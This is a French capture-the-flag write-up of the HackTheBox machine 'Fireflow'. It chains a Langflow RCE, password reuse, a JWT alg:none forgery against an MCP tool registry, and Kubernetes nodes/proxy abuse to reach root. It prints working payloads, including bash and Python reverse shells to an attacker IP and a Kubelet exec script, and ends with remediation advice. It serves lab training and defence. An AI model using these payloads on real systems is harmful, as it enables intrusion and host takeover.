# 🔥 Fireflow — HackTheBox Writeup

> **Machine:** Fireflow
> **OS:** Linux
> **Difficulty:** Medium
> **Author:** amra
> **Release:** 11ᵗʰ May 2026

---

## 📋 Sommaire

- [Résumé](#-résumé)
- [Kill Chain](#-kill-chain)
- [1. Reconnaissance](#1--reconnaissance)
- [2. Foothold — Langflow RCE (CVE-2026-33017)](#2--foothold--langflow-rce-cve-2026-33017)
- [3. Lateral Movement — SSH nightfall](#3--lateral-movement--ssh-nightfall)
- [4. Lateral Movement — JWT `alg:none` → pod MCP](#4--lateral-movement--jwt-algnone--pod-mcp)
- [5. Privilege Escalation — K8s `nodes/proxy`](#5--privilege-escalation--kubernetes-nodesproxy)
- [🩹 Erreurs rencontrées & leçons apprises](#-erreurs-rencontrées--leçons-apprises)
- [🧠 Takeaways](#-takeaways)
- [🛡️ Remédiation](#️-remédiation-côté-défense)

---

## 📝 Résumé

Fireflow est une machine Linux de difficulté **Medium** qui enchaîne 4 vecteurs :

1. **Foothold** — Un `flow_id` Langflow leaké permet d'exploiter **CVE-2026-33017** (RCE non authentifiée) → shell `www-data`.
2. **Lateral 1** — Un mot de passe présent dans le `.env` de Langflow est **réutilisé** par l'utilisateur `nightfall` → SSH.
3. **Lateral 2** — Un serveur MCP custom accepte l'algorithme JWT **`none`** → forge d'un token admin → enregistrement d'un outil malveillant → shell sur le pod `mcp`.
4. **Root** — L'environnement Kubernetes expose la permission **`nodes/proxy`**. Combinée à un pod privilégié montant le filesystem hôte (`hostPath: /`), elle permet l'exécution de commandes en root sur l'hôte.

> **Environnement de test :**
> - Attaquant (Kali) : `10.10.15.96`
> - Cible : `10.129.244.214`

---

## 🔗 Kill Chain

| Étape | Vecteur | Résultat |
|-------|---------|----------|
| Foothold | Langflow CVE-2026-33017 (RCE unauth via `flow_id`) | `www-data` |
| Lateral 1 | Réutilisation du mot de passe `.env` | SSH `nightfall` |
| Lateral 2 | JWT `alg:none` bypass → tool MCP malveillant | pod `mcp` |
| Root | K8s `nodes/proxy` + pod privilégié (hostPath `/`) | **root** sur l'hôte |

---

## 1. 🔍 Reconnaissance

### Configuration `/etc/hosts`

```bash
echo "10.129.244.214 fireflow.htb flow.fireflow.htb" | sudo tee -a /etc/hosts
```

### Scan Nmap

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.244.214 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sV -sC 10.129.244.214
```

**Ports ouverts :**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu |
| 80/tcp | HTTP | nginx (redirige vers HTTPS) |
| 443/tcp | HTTPS | nginx — *FireFlow — Task Force Nightfall* |

Le certificat TLS révèle un wildcard `DNS:*.fireflow.htb` → présence de vHosts.

### Énumération web

En visitant `https://fireflow.htb`, le bouton **« Open Agent »** redirige vers un nouveau vHost :

```bash
echo "10.129.244.214 flow.fireflow.htb" | sudo tee -a /etc/hosts
```

L'URL du playground expose un **`flow_id`** Langflow :

```
https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25
```

> ⚠️ **Note :** le `flow_id` peut être régénéré à chaque reset de la box. Si l'étape suivante renvoie un `404`, re-clique sur *Open Agent* pour récupérer le nouvel ID depuis l'URL du playground.

---

## 2. 💥 Foothold — Langflow RCE (CVE-2026-33017)

**CVE-2026-33017** permet une RCE **non authentifiée** ; le seul prérequis est un `flow_id` valide. L'endpoint `build_public_tmp` accepte un composant Python custom dont le champ `code` est exécuté côté serveur.

### Listener

```bash
nc -lvnp 9001
```

### Payload

```bash
curl -sk -X POST 'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow' \
-H 'Content-Type: application/json' \
-b 'client_id=attacker' \
-d '{"data":{"nodes":[{"id":"Exploit-001","type":"genericNode","position":{"x":0,"y":0},"data":{"id":"Exploit-001","type":"ExploitComp","node":{"template":{"code":{"type":"code","required":true,"show":true,"multiline":true,"value":"import os\n\n_x = os.system(\"bash -c '"'"'bash -i >& /dev/tcp/10.10.15.96/9001 0>&1'"'"'\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name=\"X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)->Data:\n        return Data(data={})","name":"code","password":false,"advanced":false,"dynamic":false},"_type":"Component"},"description":"X","base_classes":["Data"],"display_name":"ExploitComp","name":"ExploitComp","frozen":false,"outputs":[{"types":["Data"],"selected":"Data","name":"o","display_name":"O","method":"r","value":"__UNDEFINED__","cache":true,"allows_loop":false,"tool_mode":false,"hidden":null,"required_inputs":null,"group_outputs":false}],"field_order":["code"],"beta":false,"edited":false}}}],"edges":[]}}'
```

Résultat : reverse shell en tant que **`www-data`**.

### Stabilisation du TTY

```bash
script /dev/null -c bash
# Ctrl-Z
stty raw -echo; fg
# Entrée x2
```

### Récupération des credentials

```bash
cat /etc/langflow/.env
```

```ini
LANGFLOW_AUTO_LOGIN=False
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll   # <── réutilisé !
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
LANGFLOW_CONFIG_DIR=/var/lib/langflow
...
```

Vérification de l'existence de l'utilisateur cible :

```bash
grep 1000 /etc/passwd
# nightfall:x:1000:1000::/home/nightfall:/bin/bash
```

---

## 3. 🔄 Lateral Movement — SSH nightfall

Le mot de passe du `.env` est réutilisé par `nightfall` :

```bash
ssh nightfall@fireflow.htb
# password: n1ghtm4r3_b4_n1ghtf4ll
```

### 🚩 User flag

```bash
cat /home/nightfall/user.txt
# a87f04d845c993d373bfb23511d4e7f5
```

### Découverte du serveur MCP

```bash
cat ~/.mcp/config.json
```

```json
{
  "server": "http://10.129.244.214:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

---

## 4. 🎭 Lateral Movement — JWT `alg:none` → pod MCP

### Énumération de l'API MCP

```bash
curl -s http://10.129.244.214:30080/api/v1/version | python3 -m json.tool
```

```json
{
  "service": "MCP AI Tool Registry",
  "auth": {
    "type": "JWT",
    "supported_algorithms": ["HS256", "none"]   // <── "none" accepté !
  },
  "endpoints": [
    "POST /mcp [MCP JSON-RPC 2.0]",
    "POST /api/v1/auth",
    "GET /api/v1/tools",
    "POST /api/v1/tools [admin]"                 // <── nécessite le rôle admin
  ]
}
```

### Authentification légitime (rôle `user`)

```bash
curl -s -X POST http://10.129.244.214:30080/api/v1/auth \
-H 'Content-Type: application/json' \
-d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}'
```

Le token retourné décode en `{"sub":"langflow-bot","role":"user"}` — insuffisant pour `POST /api/v1/tools` :

```bash
# → {"detail":"Admin role required"}
```

### 🔑 Forge du token admin (bypass `alg:none`)

L'algorithme `none` signifie « pas de signature ». On forge un token avec `role: admin` et une signature vide.

```python
# craft.py
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# ⚠️ separators=(",",":") est CRUCIAL — voir section "Erreurs"
header  = b64url(json.dumps({"alg":"none","typ":"JWT"}, separators=(",",":")).encode())
payload = b64url(json.dumps({"sub":"attacker","role":"admin"}, separators=(",",":")).encode())
token = f"{header}.{payload}."   # 3ᵉ segment (signature) vide
print(token)
```

```bash
python3 craft.py
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9.
```

### Vérification de l'accès admin

```bash
ADMIN_JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9."

curl -s -X GET http://10.129.244.214:30080/api/v1/tools \
-H "Authorization: Bearer $ADMIN_JWT"
# → [{"name":"ping_host",...},{"name":"get_metrics_summary",...},{"name":"list_running_tasks",...}]
```

✅ Le token passe → accès admin.

### Enregistrement d'un outil malveillant

> 💡 **Astuce :** exécuter les `curl` vers `:30080` **depuis la session SSH nightfall** (le port peut être filtré depuis l'extérieur).

Listener sur Kali :

```bash
nc -lvnp 9001
```

Enregistrement de l'outil (le double `os.fork()` détache le process pour survivre à la fin de la requête HTTP) :

```bash
curl -s -X POST http://10.129.244.214:30080/api/v1/tools \
-H 'Content-Type: application/json' -H "Authorization: Bearer $ADMIN_JWT" \
-d '{"name":"shell","description":"debug shell","inputSchema":{"type":"object","properties":{}},"code":"import socket,os,pty\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\ns=socket.socket()\ns.connect((\"10.10.15.96\",9001))\n[os.dup2(s.fileno(),i) for i in(0,1,2)]\npty.spawn(\"/bin/sh\")"}'
# → {"status":"registered","name":"shell"}
```

### Déclenchement du shell

```bash
curl -s -X POST http://10.129.244.214:30080/mcp \
-H 'Content-Type: application/json' -H "Authorization: Bearer $ADMIN_JWT" \
-d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"shell","arguments":{}}}'
```

Shell obtenu en tant que **`mcp`** :

```bash
id
# uid=1000(mcp) gid=1000(mcp) groups=1000(mcp)
```

---

## 5. ⚙️ Privilege Escalation — Kubernetes `nodes/proxy`

### Confirmation de l'environnement Kubernetes

```bash
ls /var/run/secrets/kubernetes.io/serviceaccount
env | grep KUBERNETES
```

### Énumération des permissions du ServiceAccount

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
API=https://10.43.0.1:443

curl -sk -X POST "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
-H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
-d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' \
| python3 -c "import sys,json; [print(r) for r in json.load(sys.stdin)['status'].get('resourceRules',[])]"
```

```python
{'verbs': ['create'], 'apiGroups': ['authorization.k8s.io'], 'resources': ['selfsubjectaccessreviews', 'selfsubjectrulesreviews']}
{'verbs': ['create'], 'apiGroups': ['authentication.k8s.io'], 'resources': ['selfsubjectreviews']}
{'verbs': ['get'], 'apiGroups': [''], 'resources': ['nodes/proxy']}   # <── DANGEREUX
```

La permission **`nodes/proxy`** permet de parler directement à l'API Kubelet (port `10250`) et d'exécuter des commandes dans n'importe quel pod du node — **sans authentification supplémentaire**.

### Recherche d'un pod privilégié

> ⚠️ **Le suffixe du nom de pod change à chaque reset** — toujours ré-énumérer.

```bash
curl -sk "https://10.129.244.214:10250/pods" -H "Authorization: Bearer $TOKEN" \
| python3 -c "
import sys,json
d=json.load(sys.stdin)
for i in d['items']:
    ns=i['metadata']['namespace']; name=i['metadata']['name']
    vols=[v for v in i['spec'].get('volumes',[]) if 'hostPath' in v]
    for c in i['spec']['containers']:
        if c.get('securityContext',{}).get('privileged') and vols:
            print(ns, name, c['name'], [v['hostPath']['path'] for v in vols])
"
# monitoring prometheus-prometheus-node-exporter-nmntq node-exporter ['/proc', '/sys', '/']
```

Le pod `node-exporter` est **privilégié** et monte le filesystem hôte (`/`) → accessible sous `/host/root`.

### Exécution de commandes via l'API Kubelet (WebSocket)

```python
# kube_exec.py
#!/usr/bin/env python3
import asyncio, ssl, sys, websockets

NODE   = "10.129.244.214"
NE_NS  = "monitoring"
NE_POD = "prometheus-prometheus-node-exporter-nmntq"   # <── adapter au nom trouvé
NE_CNT = "node-exporter"
TOKEN  = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
COMMAND = sys.argv[1] if len(sys.argv) > 1 else 'id'

async def ws_exec(cmd_parts):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    args = "&".join(f"command={part}" for part in cmd_parts)
    url = (f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}"
           f"?output=1&error=1&{args}")
    async with websockets.connect(
        url, ssl=ctx,
        additional_headers={"Authorization": f"Bearer {TOKEN}"},
        subprotocols=["v4.channel.k8s.io"],
        open_timeout=10
    ) as ws:
        try:
            while True:
                data = await asyncio.wait_for(ws.recv(), timeout=5)
                if isinstance(data, bytes) and len(data) > 1:
                    sys.stdout.write(data[1:].decode("utf-8", errors="replace"))
                    sys.stdout.flush()
        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
            pass

asyncio.run(ws_exec(COMMAND.split()))
```

### Transfert vers le pod MCP

Sur Kali :

```bash
sudo python3 -m http.server 80
```

Dans le pod `mcp` :

```bash
cd /tmp
curl 10.10.15.96/kube_exec.py -o kube_exec.py
```

### Exécution en root

```bash
python3 kube_exec.py "id"
# uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)
```

### 🚩 Root flag

```bash
python3 kube_exec.py "cat /host/root/root/root.txt"
# 1ed43c219aad7f305652b3345b612b42
```

---

## 🩹 Erreurs rencontrées & leçons apprises

Cette section documente les blocages réels rencontrés pendant l'exploitation — utile pour ne pas retomber dans les mêmes pièges.

### ❌ Erreur n°1 — Espaces dans le JSON du JWT (le gros piège)

**Symptôme :** le token forgé était rejeté silencieusement par le serveur MCP, alors que la logique semblait correcte.

**Cause :** la première tentative utilisait `json.dumps()` **sans** le paramètre `separators`. Par défaut, Python produit du JSON **avec des espaces** après les `:` et les `,` :

```python
# ❌ MAUVAIS — génère {"alg": "none", "typ": "JWT"} (avec espaces)
json.dumps({"alg":"none","typ":"JWT"})
```

Ce qui donnait un token encodé différent de celui attendu par le serveur.

**Diagnostic :** comparer le header d'un **token légitime** avec le token forgé.

```bash
# Header du token légitime décodé
echo "<token_legitime>" | cut -d. -f1 | base64 -d 2>/dev/null; echo
# → {"alg":"HS256","typ":"JWT}   ← AUCUN espace !
```

**Correction :** forcer le format compact avec `separators=(",",":")` :

```python
# ✅ BON — génère {"alg":"none","typ":"JWT"} (compact, sans espaces)
json.dumps({"alg":"none","typ":"JWT"}, separators=(",",":"))
```

> 💡 **Leçon :** quand un bypass JWT échoue « sans raison », **décode et compare byte-à-byte** le header d'un token valide. Le serveur peut faire un matching strict sur l'encodage exact. Toujours utiliser `separators=(",",":")` pour reproduire le format compact standard des JWT.

### ❌ Erreur n°2 — Ne pas savoir où exécuter les commandes

**Symptôme :** confusion sur le fait d'exécuter les `curl` vers `:30080` depuis Kali ou depuis la session SSH.

**Cause :** le port `30080` (NodePort) peut être filtré depuis l'extérieur, alors qu'il est toujours joignable depuis la machine elle-même.

**Règle appliquée :**

| Où | Quoi |
|----|------|
| **Kali** | Le listener `nc` / `penelope` (le reverse shell revient vers toi) |
| **SSH nightfall** | Tous les `curl` vers le MCP (`:30080`) |

> 💡 **Leçon :** pour les services internes exposés en NodePort, privilégier l'exécution **depuis un pivot interne** déjà compromis, plutôt que directement depuis la machine attaquante.

### ⚠️ Piège n°3 — Suffixes de pods dynamiques

Les noms de pods Kubernetes (`...-nmntq`, `mcp-server-...-29ztf`) contiennent un **hash aléatoire régénéré à chaque reset** de la box. Il faut **toujours ré-énumérer** via `GET /pods` plutôt que de copier-coller le nom du writeup.

### ⚠️ Piège n°4 — Ne pas simplifier le double `os.fork()`

Le payload de l'outil MCP contient **deux** `os.fork()` successifs (double-fork daemonization). C'est intentionnel : ça détache le reverse shell du process de la requête HTTP, qui se termine sinon avant que le shell ne soit stable. Le simplifier fait mourir le shell immédiatement.

---

## 🧠 Takeaways

- **JWT `alg:none`** — Toujours vérifier les algorithmes acceptés (`/version`, `.well-known`, doc). Si `none` est dans la liste, un token non signé avec des claims élevés (`role:admin`) suffit. **Format compact obligatoire** (`separators=(",",":")`).
- **Réutilisation de mots de passe** — Un secret trouvé dans un `.env` doit systématiquement être testé sur SSH et les autres services/utilisateurs.
- **K8s `nodes/proxy`** — Permission d'escalade souvent sous-estimée. Combinée à un pod privilégié avec un `hostPath: /`, c'est un **root direct sur l'hôte** via l'API Kubelet (`:10250`), sans authentification supplémentaire.
- **Méthodologie de debug JWT** — Décoder et comparer un token légitime est le diagnostic le plus rapide quand un bypass échoue silencieusement.

---

## 🛡️ Remédiation (côté défense)

| Vulnérabilité | Correction |
|---------------|------------|
| CVE-2026-33017 (Langflow) | Mettre à jour Langflow ; désactiver les endpoints `build_public_tmp` ; ne jamais exposer un `flow_id` publiquement |
| Réutilisation de mot de passe | Secrets uniques par service ; vault ; rotation régulière |
| JWT `alg:none` | **Interdire `none`** ; whitelister explicitement les algorithmes de signature ; valider la signature côté serveur |
| Enregistrement de tools MCP | Contrôle d'accès strict ; sandboxing de l'exécution de code ; pas d'exécution de code arbitraire |
| K8s `nodes/proxy` | Retirer cette permission des ServiceAccounts applicatifs (principe du moindre privilège) |
| Pods privilégiés + hostPath | Éviter `privileged: true` ; PodSecurityStandards `restricted` ; ne pas monter `/` de l'hôte |

---

<p align="center">
  <b>Machine rooted 🔥</b><br>
  <sub>Writeup à but éducatif — HackTheBox</sub>
</p>
